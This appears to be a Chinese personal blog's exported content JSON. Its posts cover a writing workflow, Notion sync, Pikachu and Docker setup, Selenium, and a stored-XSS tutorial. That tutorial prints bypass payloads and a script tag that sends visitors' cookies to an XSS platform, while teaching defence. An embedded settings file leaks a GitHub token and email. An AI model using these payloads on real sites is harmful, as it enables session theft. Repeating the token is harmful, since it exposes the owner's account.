{"meta":{"title":"moyao","subtitle":"","description":"至繁归于至简","author":"莫遥","url":"https://www.zhengjunyao.top","root":"/"},"pages":[{"title":"自说自话","date":"2021-12-22T07:16:19.000Z","updated":"2022-01-10T17:29:22.612Z","comments":true,"path":"artitalk/index.html","permalink":"https://www.zhengjunyao.top/artitalk/index.html","excerpt":"","text":""},{"title":"关于","date":"2021-12-11T17:20:42.000Z","updated":"2022-01-10T17:28:41.281Z","comments":false,"path":"about/index.html","permalink":"https://www.zhengjunyao.top/about/index.html","excerpt":"","text":""},{"title":"bangumis","date":"2021-12-26T14:56:34.000Z","updated":"2022-01-10T17:27:24.064Z","comments":true,"path":"bangumis/index.html","permalink":"https://www.zhengjunyao.top/bangumis/index.html","excerpt":"","text":""},{"title":"comments","date":"2021-12-21T07:59:36.000Z","updated":"2022-01-10T17:27:07.268Z","comments":true,"path":"comments/index.html","permalink":"https://www.zhengjunyao.top/comments/index.html","excerpt":"","text":""},{"title":"网站统计","date":"2021-12-31T02:27:25.000Z","updated":"2022-01-10T17:28:59.562Z","comments":false,"path":"census/index.html","permalink":"https://www.zhengjunyao.top/census/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-12-11T16:56:56.000Z","updated":"2022-01-10T17:29:31.281Z","comments":false,"path":"categories/index.html","permalink":"https://www.zhengjunyao.top/categories/index.html","excerpt":"","text":""},{"title":"文章统计","date":"2021-12-29T16:54:38.000Z","updated":"2022-01-10T17:28:08.981Z","comments":false,"path":"charts/index.html","permalink":"https://www.zhengjunyao.top/charts/index.html","excerpt":"","text":""},{"title":"friends","date":"2022-01-01T15:53:52.000Z","updated":"2022-01-01T15:53:52.553Z","comments":true,"path":"friends/index.html","permalink":"https://www.zhengjunyao.top/friends/index.html","excerpt":"","text":""},{"title":"folder","date":"2021-12-28T09:20:11.000Z","updated":"2022-01-10T17:16:26.287Z","comments":true,"path":"folder/index.html","permalink":"https://www.zhengjunyao.top/folder/index.html","excerpt":"","text":""},{"title":"","date":"2021-12-29T05:29:48.906Z","updated":"2021-12-29T05:29:48.906Z","comments":true,"path":"config/posts.json","permalink":"https://www.zhengjunyao.top/config/posts.json","excerpt":"{\"posts\":[{\"content\":\"> 欢迎来到我的小站呀，很高兴遇见你！🤝\\n\\n## 🏠 关于本站\\n\\n## 👨‍💻 博主是谁\\n\\n## ⛹ 兴趣爱好\\n\\n## 📬 联系我呀\\n\",\"data\":{\"title\":\"关于\",\"date\":\"2019-01-25 19:09:48\",\"tags\":null,\"published\":true,\"hideInList\":true,\"feature\":null,\"isTop\":false},\"isEmpty\":false,\"excerpt\":\"\",\"abstract\":\"\",\"fileName\":\"about\"},{\"content\":\"👏 欢迎使用 **Gridea** ！ \\n✍️ **Gridea** 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... \\n\\n","text":"{\"posts\":[{\"content\":\"> 欢迎来到我的小站呀，很高兴遇见你！🤝\\n\\n## 🏠 关于本站\\n\\n## 👨‍💻 博主是谁\\n\\n## ⛹ 兴趣爱好\\n\\n## 📬 联系我呀\\n\",\"data\":{\"title\":\"关于\",\"date\":\"2019-01-25 19:09:48\",\"tags\":null,\"published\":true,\"hideInList\":true,\"feature\":null,\"isTop\":false},\"isEmpty\":false,\"excerpt\":\"\",\"abstract\":\"\",\"fileName\":\"about\"},{\"content\":\"👏 欢迎使用 **Gridea** ！ \\n✍️ **Gridea** 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... \\n\\n\\n\\n[Github](https://github.com/getgridea/gridea) \\n[Gridea 主页](https://gridea.dev/) \\n[示例网站](http://fehey.com/)\\n\\n## 特性👇\\n📝 你可以使用最酷的 **Markdown** 语法，进行快速创作 \\n\\n🌉 你可以给文章配上精美的封面图和在文章任意位置插入图片 \\n\\n🏷️ 你可以对文章进行标签分组 \\n\\n📋 你可以自定义菜单，甚至可以创建外部链接菜单 \\n\\n💻 你可以在 **Windows**，**MacOS** 或 **Linux** 设备上使用此客户端 \\n\\n🌎 你可以使用 **𝖦𝗂𝗍𝗁𝗎𝖻 𝖯𝖺𝗀𝖾𝗌** 或 **Coding Pages** 向世界展示，未来将支持更多平台 \\n\\n💬 你可以进行简单的配置，接入 [Gitalk](https://github.com/gitalk/gitalk) 或 [DisqusJS](https://github.com/SukkaW/DisqusJS) 评论系统 \\n\\n🇬🇧 你可以使用**中文简体**或**英语** \\n\\n🌁 你可以任意使用应用内默认主题或任意第三方主题，强大的主题自定义能力 \\n\\n🖥 你可以自定义源文件夹，利用 OneDrive、百度网盘、iCloud、Dropbox 等进行多设备同步 \\n\\n🌱 当然 **Gridea** 还很年轻，有很多不足，但请相信，它会不停向前 🏃\\n\\n未来，它一定会成为你离不开的伙伴\\n\\n尽情发挥你的才华吧！\\n\\n😘 Enjoy~\\n\",\"data\":{\"title\":\"Hello Gridea\",\"date\":\"2018-12-12 00:00:00\",\"tags\":[\"Gridea\"],\"published\":true,\"hideInList\":false,\"feature\":\"/post-images/hello-gridea.png\",\"isTop\":false},\"isEmpty\":false,\"excerpt\":\"\",\"abstract\":\"👏 欢迎使用 **Gridea** ！ \\n✍️ **Gridea** 一个静态博客写作客户端。你可以用它来记录你的生活、心情、知识、笔记、创意... ... \",\"fileName\":\"hello-gridea\"}],\"tags\":[{\"name\":\"Gridea\",\"slug\":\"uRGa_Frk4\",\"used\":true}],\"menus\":[{\"link\":\"/\",\"name\":\"首页\",\"openType\":\"Internal\"},{\"link\":\"/archives\",\"name\":\"归档\",\"openType\":\"Internal\"},{\"link\":\"/tags\",\"name\":\"标签\",\"openType\":\"Internal\"},{\"link\":\"/post/about\",\"name\":\"关于\",\"openType\":\"Internal\"}]}"},{"title":"","date":"2021-12-29T05:29:48.849Z","updated":"2021-12-29T05:29:48.849Z","comments":true,"path":"config/setting.json","permalink":"https://www.zhengjunyao.top/config/setting.json","excerpt":"","text":"{\"config\":{\"branch\":\"master\",\"cname\":\"zhengjunyao.top\",\"domain\":\"https://www.zhengjunyao.top\",\"email\":\"1060477485@qq.com\",\"platform\":\"github\",\"repository\":\"noutinmountain.github.io\",\"token\":\"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\",\"username\":\"noutinmountain\"},\"comment\":{\"commentPlatform\":\"gitalk\",\"disqusSetting\":{\"api\":\"\",\"apikey\":\"\",\"shortname\":\"\"},\"gitalkSetting\":{\"clientId\":\"\",\"clientSecret\":\"\",\"owner\":\"\",\"repository\":\"\"},\"showComment\":false}}"},{"title":"","date":"2021-12-29T05:22:48.892Z","updated":"2021-12-29T05:22:48.892Z","comments":true,"path":"config/theme.json","permalink":"https://www.zhengjunyao.top/config/theme.json","excerpt":"","text":"{\"config\":{\"archivesPageSize\":50,\"archivesPath\":\"archives\",\"dateFormat\":\"YYYY-MM-DD\",\"feedCount\":10,\"feedFullText\":true,\"footerInfo\":\"Powered by Gridea\",\"postPageSize\":10,\"postPath\":\"post\",\"postUrlFormat\":\"SLUG\",\"showFeatureImage\":true,\"siteDescription\":\"温故而知新\",\"siteName\":\"Gridea\",\"tagPath\":\"tag\",\"tagUrlFormat\":\"SHORT_ID\",\"themeName\":\"notes\"},\"customConfig\":{}}"},{"title":"莫遥的文档","date":"2021-12-11T16:57:08.000Z","updated":"2022-01-10T17:28:49.696Z","comments":false,"path":"link/index.html","permalink":"https://www.zhengjunyao.top/link/index.html","excerpt":"","text":""},{"title":"电影","date":"2021-12-16T04:52:02.000Z","updated":"2022-01-10T17:44:52.815Z","comments":true,"path":"movie/index.html","permalink":"https://www.zhengjunyao.top/movie/index.html","excerpt":"","text":""},{"title":"log","date":"2021-12-31T07:19:26.000Z","updated":"2021-12-31T07:19:26.617Z","comments":true,"path":"log/index.html","permalink":"https://www.zhengjunyao.top/log/index.html","excerpt":"","text":""},{"title":"picture","date":"2021-12-26T15:28:42.000Z","updated":"2022-01-10T17:27:34.983Z","comments":true,"path":"picture/index.html","permalink":"https://www.zhengjunyao.top/picture/index.html","excerpt":"","text":"壁纸 收藏的壁纸 生活 分享生活 媒体 媒体图片"},{"title":"歌单","date":"2021-12-27T03:24:24.000Z","updated":"2021-12-28T08:37:42.693Z","comments":true,"path":"music/index.html","permalink":"https://www.zhengjunyao.top/music/index.html","excerpt":"","text":"console.error(\"Error: [hexo-tag-aplayer] Meting support is disabled, cannot resolve the meting tags properly.\");"},{"title":"标签","date":"2021-12-11T16:57:08.000Z","updated":"2022-01-10T17:28:45.996Z","comments":false,"path":"tags/index.html","permalink":"https://www.zhengjunyao.top/tags/index.html","excerpt":"","text":""},{"title":"","date":"2021-12-29T05:22:00.247Z","updated":"2021-12-29T05:22:00.247Z","comments":true,"path":"static/404.html","permalink":"https://www.zhengjunyao.top/static/404.html","excerpt":"","text":"Page Not Found * { margin: 0; padding: 0; } body { display: flex; flex-direction: column; height: 100vh; text-align: center; } .box { flex: 1; display: flex; justify-content: center; flex-direction: column; } .number { font-size: 80px; color: #666; font-weight: bold; } .text { font-size: 14px; margin: 24px; color: #333; } .btn-container { display: flex; justify-content: center; } .btn { padding: 8px 24px; display: inline-block; text-decoration: none; background: #fff; border: 2px solid #efefef; color: #333; margin: 24px; border-radius: 20px; cursor: pointer; display: flex; align-items: center; } .footer { padding: 16px; border-top: 1px solid #efefef; color: #777; font-weight: lighter; } .footer a { text-decoration: none; font-weight: bold; color: #000; } 4 0 4 Page not found Back Powered by Gridea var back = document.getElementById('back') back.onclick = function() { console.log('run...'); history.back() }"},{"title":"更新日志","date":"2022-01-01T15:40:13.000Z","updated":"2022-01-01T16:08:26.549Z","comments":true,"path":"update/index.html","permalink":"https://www.zhengjunyao.top/update/index.html","excerpt":"","text":""},{"title":"video","date":"2021-12-28T07:08:20.000Z","updated":"2021-12-28T08:50:52.555Z","comments":true,"path":"video/index.html","permalink":"https://www.zhengjunyao.top/video/index.html","excerpt":"","text":""},{"title":"wallpaper","date":"2021-12-26T16:07:04.000Z","updated":"2022-01-10T17:28:54.435Z","comments":true,"path":"wallpaper/index.html","permalink":"https://www.zhengjunyao.top/wallpaper/index.html","excerpt":"","text":""},{"title":"life","date":"2021-12-26T16:07:13.000Z","updated":"2022-01-10T17:21:17.105Z","comments":true,"path":"picture/life/index.html","permalink":"https://www.zhengjunyao.top/picture/life/index.html","excerpt":"","text":""},{"title":"text","date":"2021-12-11T15:22:39.000Z","updated":"2021-12-11T15:22:39.670Z","comments":true,"path":"text/index.html","permalink":"https://www.zhengjunyao.top/text/index.html","excerpt":"","text":""},{"title":"media","date":"2021-12-26T16:07:21.000Z","updated":"2022-01-10T17:28:35.407Z","comments":true,"path":"picture/media/index.html","permalink":"https://www.zhengjunyao.top/picture/media/index.html","excerpt":"","text":""}],"posts":[{"title":"typora+upic+阿里云oss写作流","slug":"typora+upic+阿里云oss写作流","date":"2022-06-21T02:17:35.566Z","updated":"2022-06-21T02:50:06.697Z","comments":true,"path":"2022/06/21/typora+upic+阿里云oss写作流/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/21/typora+upic+%E9%98%BF%E9%87%8C%E4%BA%91oss%E5%86%99%E4%BD%9C%E6%B5%81/","excerpt":"","text":"搭建个人博客后写文章不可避免的要选择写作工具和图床 选择typora目前主力是使用typora写作，这款工具简洁易用，所见即所得，没有那么多花里胡哨，不愧是国产之光 图床选择自己搭建的阿里云oss图床图床选择的话之前一直白嫖jsd，自从jsd被限制后就转用了知乎的，后面知乎图床也不对外开放，兜兜转转一堆麻烦，图片迁移来迁移去很麻烦，果然免费才是最贵的，自己用阿里云oss搭建了个图床，流量费也还可以，毕竟图片是存在自己这里的，而且速度和稳定都可以，当然也搭过github图床，因为在国内不是很稳定，我就老是上传不了，梯子需要一直切换节点改host等很麻烦，作罢 图床上传工具upic搭建后图床后需要一款工具连接图床，阿里云官方的不好用，我是mac端所以在GitHub上找了个开源工具upic，应用商店现在有上架，配置起来很简单，支持截图剪切板上传 typora支持upic的上传服务 写作流用typora写作，然后图片直接截图，粘贴，typora会自动将截图上传至我的图床，然后继续写作，相比之前上传然后粘贴图片url简单多了，而且避免了思路在来回切换时的打断，写完后直接保存更新至我的博客中，当然一篇博客可以一键多平台同步，还有typora写作的md文档可以选择工具转换适配微信公众号，这些技巧下面会继续说 感谢您的阅读，有什么问题可以email找我","categories":[{"name":"工作流","slug":"工作流","permalink":"https://www.zhengjunyao.top/categories/%E5%B7%A5%E4%BD%9C%E6%B5%81/"}],"tags":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/tags/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"}]},{"title":"使用i微信阅读笔记一键同步到notion","slug":"如何将微信读书的笔记一键同步到_notion_","date":"2022-06-21T01:44:56.632Z","updated":"2022-06-21T03:21:15.749Z","comments":true,"path":"2022/06/21/如何将微信读书的笔记一键同步到_notion_/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/21/%E5%A6%82%E4%BD%95%E5%B0%86%E5%BE%AE%E4%BF%A1%E8%AF%BB%E4%B9%A6%E7%9A%84%E7%AC%94%E8%AE%B0%E4%B8%80%E9%94%AE%E5%90%8C%E6%AD%A5%E5%88%B0_notion_/","excerpt":"","text":"i 微信读书插件，之前已经支持了将笔记同步到 flomo 和 readwise，notion 由于 notion 的接口稍微比其他第三方复杂一点，一共需要两个步骤，所以单独写一篇使用文档。 notion 效果我们先来看下同步成功的效果。 • 插件会在一个目录 (page) 下，自动创建一个叫 “i 微信读书” 的表格（database）。 会记录每本书的标题、链接、作者、简介、评分、字数等基本信息。 • 我们可以使用 notion 的视图功能，来展示不同的样式。 • 点击每条记录，会进入到笔记详情当中，包含每本书所有的划线和评论。 i 微信读书插件配置i 微信读书插件需要配置两个参数，分别对应 notion 的两个步骤。 一个是 token，一个是 page_id。 token首先我们要理解，插件相当于创建了一个机器人，帮你把微信读书笔记，写到了你的 notion 笔记本当中。 而恰好 notion 支持创建机器人，这里的 token 就是机器人的授权码，谁拿到这个授权码，谁就可以对机器人发号施令。（当然，机器人的权限是受限制的，并且主人可以随时关闭和删除机器人，所以不用担心安全问题） 那怎么创建 notion 机器人呢？其实 notion 有文档，为了操作简单，我可以直接告诉你。 登陆 notion。2. 访问 https://www.notion.so/my-integrations。3. 填写必要的信息，点击创建。 就这么简单，可以看到，这里我创建了一个叫 ireader 的机器人，上面的 Secrets 就是我说的 token，复制它填写到插件的第一个输入框即可。 page_idpage_id 主要是 notion 用来权限控制的，你可以理解为，你虽然创建了一个 notion 机器人，但他可以访问你的哪个目录，哪个文件，其实需要你给他开一下权限。就像给你的朋友分享文档权限一样。 所有这里，我们要找一个页面，给机器人开启编辑权限即可。 例如，我在 “笔记” 页面下，点击“share”，邀请了机器人 ireader 。 注意，这里父级要的是一个 page , 不是 database。 机器人对这个页面有了编辑权限，地址栏中的后面那串字符串就是 page_id ，我们拷贝复制到第二个输入框即可。 注意，如果你的目录名称是英文，URL 上除去英文名称的部分才是 pageid 验证我们在插件中填入 token 和 page_id 后，点击同步，可以看到同步成功，则说明配置成功，后续将不用重新配置，每本书轻轻一点即可。 安装可以在 Chrome 应用商店搜索 “i 微信读书” 安装插件 无法访问 google 的朋友，可以访问官网进行手动下载安装。 https://secreter.github.io/ireader/index.html","categories":[{"name":"效率工具","slug":"效率工具","permalink":"https://www.zhengjunyao.top/categories/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/"}],"tags":[{"name":"notion","slug":"notion","permalink":"https://www.zhengjunyao.top/tags/notion/"}]},{"title":"渗透测试靶场pikachu搭建（docker）","slug":"Docker安装部署渗透测试平台pikachu","date":"2022-06-15T09:04:27.490Z","updated":"2022-06-15T09:25:06.315Z","comments":true,"path":"2022/06/15/Docker安装部署渗透测试平台pikachu/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/15/Docker%E5%AE%89%E8%A3%85%E9%83%A8%E7%BD%B2%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B9%B3%E5%8F%B0pikachu/","excerpt":"","text":"“如果你想搞懂一个漏洞，比较好的方法是：你可以自己先制造出这个漏洞（用代码编写），然后再利用它，最后再修复它” Pikachu是一个带有漏洞的Web应用系统，在这里包含了常见的web安全漏洞。 如果你是一个Web渗透测试学习人员且正发愁没有合适的靶场进行练习，那么Pikachu可能正合你意 下载pikachu到本地下载点击这里 Docker上部署前的准备首先得提前安装好”PHP+MYSQL+中间件（如apache,nginx等）”的基础环境 在docker直接输入以下命令： docker pull mysql docker pull php 部署pikachu 切换到pikachu本地路径 输入以下命令（注意最后有个点，默认使用 “上下文目录（Context）下的名为Dockerfile 的文件作为 Dockerfile”） docker build -t &quot;pikachu&quot; . 部署运行成功 4.进入docker直接跳转即可 本地部署成功 部署成功直接开干，渗透测试的靶场拿来练习","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.zhengjunyao.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Docker(mac)的安装","slug":"安装_Docker（macOS）","date":"2022-06-15T03:42:28.189Z","updated":"2022-06-15T07:05:35.066Z","comments":true,"path":"2022/06/15/安装_Docker（macOS）/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/15/%E5%AE%89%E8%A3%85_Docker%EF%BC%88macOS%EF%BC%89/","excerpt":"","text":"本文简单介绍介绍如何在 macOS 系统下安装 Docker 前提条件安装 Docker 时，macOS 系统最低要求为 Mojave 10.14。详情请访问 Docker Desktop for Mac。 安装 Docker方式一：使用 Homebrew 安装Homebrew 的 Cask 已经支持 Docker Desktop for Mac。因此，您可以很方便的使用 Homebrew Cask 来安装 Docker： 1$ brew install --cask docker 方式二：手动下载安装如果您需要手动下载，请下载 Docker 官网的 Docker.dmg 文件，文件大约 500 MB。 如同 macOS 其它软件一样，安装也非常简单，双击下载的 .dmg 文件，然后将 Moby 的鲸鱼图标拖拽到 Application 文件夹即可。 运行 Docker 中的服务 从您的桌面应用中找到 Docker 图标并点击运行。 运行之后，会在右上角菜单栏看到多了一个 Moby 鲸鱼图标，这个图标表明了 Docker 的运行状态。 每次点击鲸鱼图标会弹出操作菜单。 之后，您可以在终端通过命令检查安装后的 Docker 版本。 1234$ docker --versionDocker version 20.10.0, build 7287ab3 （可选）如果 docker version、docker info 都正常的话，可以尝试运行一个 Nginx 服务器。 运行以下命令运行 Nginx 服务。 123$ docker run -d -p 80:80 --name webserver nginx 服务运行后，访问 http://localhost，如果看到了 “Welcome to nginx!”，就说明 Docker Desktop for Mac 安装成功了。 要停止 Nginx 服务器并删除执行下面的命令： 1234$ docker stop webserver$ docker rm webserver 镜像加速如果您在使用过程中发现拉取 Docker 镜像十分缓慢，可以配置 Docker 国内镜像加速。","categories":[{"name":"运维","slug":"运维","permalink":"https://www.zhengjunyao.top/categories/%E8%BF%90%E7%BB%B4/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://www.zhengjunyao.top/tags/Docker/"}]},{"title":"存储型xss的攻防","slug":"存储型_XSS_的攻防","date":"2022-06-15T03:06:34.185Z","updated":"2022-06-15T03:32:40.936Z","comments":true,"path":"2022/06/15/存储型_XSS_的攻防/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/15/%E5%AD%98%E5%82%A8%E5%9E%8B_XSS_%E7%9A%84%E6%94%BB%E9%98%B2/","excerpt":"","text":"存储型 XSS 是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，一般是注入一段 javascript 脚本。 不想做开发的黑客不是好黑客。 本文只对存储型 XSS 进行分析。那么，什么是存储型 XSS 呢？ 它是通过对网页注入可执行代码且成功地被浏览器执行，达到攻击的目的，一般是注入一段 javascript 脚本。在测试过程中，我们一般是使用： 12&lt;script&gt;alert(1)&lt;/script&gt; 通过这段 js 代码，弹个框来证明存在 xss 漏洞。那么，可能新手就会问了，弹个框有什么用呢？ 其实，弹框只是为了证明存在此漏洞。而此漏洞的利用方式由很多种。 比如，你可以使用 xss 平台： 写入一段平台生成的 xss 脚本： 12&lt;script src=//xsspt.com/ZsgUBf&gt;&lt;/script&gt; 当某人进入带有这个脚本的页面时，js 脚本会获取他的 cookie 并发往 xss 平台。 你只需要登录 xss 平台等待即可，拿到 cookie 后，可以不需要密码登录他的账号。 注意：本文的重点是一步一步以黑客的角度进行 xss 攻击，再讨论如何站在开发者的角度去一步一步防御 xss 攻击。所以我会在本文中以开发的身份修正后端代码，再以黑客的身份进行前端页面的 xss 攻击，这一点需要注意哦。 对于存储型 xss 漏洞的表现形式，比较经典的是留言板。但是我们都是遵纪守法的好同学，不能对外面的网站进行测试，所以就花半个小时自己手撸一个留言板咯。 首先，应该有前端展示的页面 Message_Board.php 和后端存储数据的页面 addMessage.php 前端代码不是本文重点（感兴趣的可以去看看代码：https://github.com/BrucessKING/Back-stage-Management） 我们重点关注后端代码 addMessage.php： 1234567891011121314151617181920&lt;?php $nickname = @$_POST[&#x27;nickname&#x27;];//昵称 $email = @$_POST[&#x27;email&#x27;];//邮箱 $content = @$_POST[&#x27;content&#x27;];//留言内容 $now_time = @$_POST[&#x27;now_time&#x27;];//留言时间 $ini= @parse_ini_file(&quot;config.ini&quot;); $con = @mysql_connect($ini[&quot;servername&quot;],$ini[&quot;username&quot;],$ini[&quot;password&quot;]); if($con)&#123; mysql_query(&quot;set names &#x27;utf8&#x27;&quot;);//解决中文乱码问题 mysql_select_db($ini[&quot;dbname&quot;]); $sql1 = &quot;select count(*) from message_board&quot;; $result = mysql_query($sql1); $floor = mysql_fetch_row($result)[0] + 1; $sql = &quot;insert into message_board values($floor,\\&quot;$nickname\\&quot;,\\&quot;$email\\&quot;,\\&quot;$content\\&quot;,\\&quot;$now_time\\&quot;)&quot;; mysql_query($sql); &#125;?&gt; 可以看到，我们对传入的四个参数完全没有处理，而是直接存入数据库中。 所以，只要我们这样输入： 提交之后，系统会自动刷新页面出现弹框： 点击确定后，你会发现留言内容和留言者的部分都为空。 这是因为 js 脚本已经被解析了，这时我们按 F12，打开浏览器的开发者工具，发现了 js 脚本。 那么，问题来了。 毕竟我们还有另外一个身份，开发者该如何防御呢？ 0x00、来个最简单的，只修改前端代码在 input 标签里面加上 maxlength 属性 123&lt;input type=&quot;text&quot; &gt; 至于原理嘛，就是因为 js 脚本的形式为 长度为 17，所以只要我们在前端对长度进行限制，就可以阻止黑客进行 xss 攻击了 可是！开发可没这么好做！ 我们是想做开发的黑客，所以还得自己搞自己。 作为攻击者，我们同样可以修改前端代码，具体的操作是使用浏览器的 F12（开发者工具） 可以看到，我们可以直接进行长度的修改。 另外，还可以用抓包的方法，在包里面直接写，也是不受长度限制的。 0x01、对关键字 script 进行过滤作为开发者，你很容易发现，要想进行 xss 攻击，必须插入一段 js 脚本，而 js 脚本的特征是很明显的，脚本中包含 script 关键字，那么我们只需要进行 script 过滤即可。 回到之前的代码。 为方便说明，我只取 nickname 参数，其实传入的四个参数需要做同样的处理。 123$nickname = str_replace(&quot;script&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称 上面这个 str_replace() 函数的意思是把 script 替换为空。 可以看到，script 被替换为空，弹框失败。 那么黑客该如何继续进行攻击呢？ 答案是：大小写绕过 123&lt;sCrIPt&gt;alert(1)&lt;/ScripT&gt; 因为 js 是不区分大小写的，所以我们的大小写不影响脚本的执行 成功弹框 ****0x02、使用 str_ireplace() 函数进行不区分大小写地过滤 script 关键字作为一名优秀的开发，发现了问题当然要及时改正，不区分大小写不就行了嘛 后端代码修正如下： 123$nickname = str_ireplace(&quot;script&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称 str_ireplace() 函数类似于上面的 str_replace（），但是它不区分大小写。 那么，大黑阔该如何绕过？ 答案是：双写 script 123&lt;Sscriptcript&gt;alert(1)&lt;/Sscriptcript&gt; 原理就是 str_ireplace() 函数只找出了中间的 script 关键字，前面的 S 和后面的 cript 组合在一起，构成了新的 Script 关键字。 弹框成功！ 0x03、使用 preg_replace() 函数进行正则表达式过滤 script 关键字 123$nickname = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称 显然，弹框失败。 攻击者如何再一次绕过？ 答案是：用 img 标签的 oneerror 属性 123&lt;img src=x onerror=alert(1)&gt; 0x04、过滤 alert 关键字看到这里，不知道你烦了没有，以开发的角度来讲，我都有点烦。大黑阔你不是喜欢弹窗么？我过滤 alert 关键字看你怎么弹！ 1234$nickname = preg_replace( &quot;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&quot;, &quot;&quot;, @$_POST[&#x27;nickname&#x27;]);//昵称$nickname = preg_replace( &quot;(.*)a(.*)l(.*)e(.*)r(.*)t/i&quot;, &quot;&quot;, $nickname);//昵称 那么，攻击者该怎么办呢？ 答案是：编码绕过 123&lt;a href=javascript:alert(1)&gt;a&lt;/a&gt; 当点击页面上的超链接时，会弹框。 但是为什么呢？ 这种编码方式为字符编码 字符编码：十进制、十六进制 ASCII 码或 unicode 字符编码，样式为 “&amp;#数值;”, 例如 “j” 可以编码为 “&#106;” 或 “&#x6a; ” 上述代码解码之后如下： 123&lt;a href=javascript:alert(1)&gt;a&lt;/a&gt; 你能明显感觉到限制：由于使用到了 a 标签，所以只有点击时，才会弹框。 作为一个大黑阔，我们当然是不满意的，能不能让所有进入这个页面的人都弹框？ 当然可以了：用 iframe 标签编码 123&lt;iframe src=javascript:alert(1)&gt; 这种写法，同样既没有 script 关键字，又没有 alert 关键字。 可以看到弹框成功！ 可是你也能看到，由于使用了 iframe 标签，留言板的样式已经变形了。实战中尽量不要用。 0x05、过滤特殊字符优秀的开发，永不认输！你个小小的黑阔，不就是会插入 js 代码么？我过滤特殊字符，看你代码咋被解析？ 可是我不想手撸代码来列举那么多特殊字符怎么办？ php 给我们提供了 htmlentities() 函数： 123$nickname = htmlentities(@$_POST[&#x27;nickname&#x27;]);//昵称 htmlentities() 函数的作用是把字符转换为 HTML 实体。 显示结果描述实体名称实体编号&nbsp;空格&amp;nbsp;&amp;#160;&lt;小于号&amp;lt;&amp;#60;&gt;大于号&amp;gt;&amp;#62;&amp;和号&amp;amp;&amp;#38;\"引号&amp;quot;&amp;#34;'撇号&nbsp;&amp;apos; (IE 不支持)&amp;#39;￠分（cent）&amp;cent;&amp;#162;£镑（pound）&amp;pound;&amp;#163;¥元（yen）&amp;yen;&amp;#165;€欧元（euro）&amp;euro;&amp;#8364;§小节&amp;sect;&amp;#167;©版权（copyright）&amp;copy;&amp;#169;®注册商标&amp;reg;&amp;#174;™商标&amp;trade;&amp;#8482;×乘号&amp;times;&amp;#215;÷除号&amp;divide;&amp;#247; 看到这里，你可能还是不明白 HTML 字符实体是什么。我举个例子吧，当你想在 HTML 页面上显示一个小于号（&lt;）时，浏览器会认为这是标签的一部分（因为所有标签都由大于号，标签名和小于号构成），因此，为了能在页面上显示这个小于号（&lt;），我们引入了 HTML 字符实体的概念，能够在页面上显示类似于小于号（&lt;）这样的特殊符号，而不会影响到页面标签的解析。 可以看到，我们输入的内容全部显示在页面上了。 可是却没有弹框。 我们鼠标右键，查看网页源代码： 实际上，我们输入的内容已经变成了 HTML 实体： 123&lt;iframe src=&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt; 无法被解析为 js 脚本。 黑客在当前场景下已经无法攻击了（在某些其他场景，即使使用了 htmlentities() 函数，仍然是可以攻击的，这就不在本文讨论范围之内了） 0x06、总结开发者不应该只考虑关键字的过滤，还应该考虑特殊符号的过滤 。 黑客在面对未知的情况时，要不断尝试，这对于知识的储备量有较高的要求。 对于 xss 攻击，站在开发者角度来讲，仅仅用一个 htmlentities() 函数基本可以做到防御，可是一个优秀的开发者应该明白它的原理。站在黑客的角度来讲，面对环境的逐步变化，条件的逐步限制，攻击思路灵活变化是对整个职业生涯有益的。","categories":[{"name":"软件测试","slug":"软件测试","permalink":"https://www.zhengjunyao.top/categories/%E8%BD%AF%E4%BB%B6%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.zhengjunyao.top/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Mac安装Selenium并配置ChromeDriver","slug":"在 Mac 系统下搭建 Selenium 环境并驱动 Chrome 浏览器","date":"2022-06-08T07:42:42.996Z","updated":"2022-06-08T07:56:44.182Z","comments":true,"path":"2022/06/08/在 Mac 系统下搭建 Selenium 环境并驱动 Chrome 浏览器/","link":"","permalink":"https://www.zhengjunyao.top/2022/06/08/%E5%9C%A8%20Mac%20%E7%B3%BB%E7%BB%9F%E4%B8%8B%E6%90%AD%E5%BB%BA%20Selenium%20%E7%8E%AF%E5%A2%83%E5%B9%B6%E9%A9%B1%E5%8A%A8%20Chrome%20%E6%B5%8F%E8%A7%88%E5%99%A8/","excerpt":"","text":"安装 selenium 打开终端 -&gt;pip 安装（安装命令：pip3 install selenium） 安装浏览器驱动ChromeDriver 1. 查看 Chrome 版本 打开 chrome，在设置 -&gt; 关于 Chrome 查看 Chrome 的版本号。 2. 查找 Chrome 和 ChromeDriver 的对应关系 Chrome73 以上版本，ChromeDriver 版本与 Chrome 版本均保持一致；Chrome73 以下版本，可参考以下关系表，查找 ChromeDriver 版本。 3. 下载对应 ChromeDriver 打开 ChromeDriver 下载地址：http://chromedriver.storage.googleapis.com/index.html 选择对应版本的 4. ChromeDriver 环境配置 进入 / usr/local/bin 